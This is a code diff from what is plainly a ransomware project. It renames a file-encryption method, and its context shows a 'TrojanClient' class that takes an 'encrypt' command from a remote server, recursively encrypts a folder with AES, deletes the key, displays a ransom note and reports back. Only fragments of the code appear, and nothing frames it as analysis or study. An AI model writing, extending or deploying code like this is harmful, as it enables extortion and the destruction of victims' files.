@@ -28,7 +28,7 @@ class FileEncryptor:
     """אחראי על הצפנה ופענוח של קבצים"""
 
     @staticmethod
-    def encrypt_all(folder_path, aes_key):  #asdasdasdsasad
+    def encrypt_folder(folder_path, aes_key):  #asdasdasdsasad
         for file_name in os.listdir(folder_path):
             full_path = os.path.join(folder_path, file_name)
             if os.path.isfile(full_path):
@@ -47,7 +47,7 @@ class FileEncryptor:
                 except Exception:
                     continue
             elif os.path.isdir(full_path):
-                FileEncryptor.encrypt_all(full_path, aes_key)
+                FileEncryptor.encrypt_folder(full_path, aes_key)
 
     @staticmethod
     def decrypt_all(folder_path, aes_key): #213213213swdasdas
@@ -113,7 +113,7 @@ class TrojanClient:
         action = protocol.receive(self.connection).decode("utf-8")
 
         if action == "encrypt":
-            FileEncryptor.encrypt_all(self.folder, aes_key)
+            FileEncryptor.encrypt_folder(self.folder, aes_key)
             del aes_key
             RansomNote.show_encrypted()
             protocol.send(self.connection, "the files are encrypted")
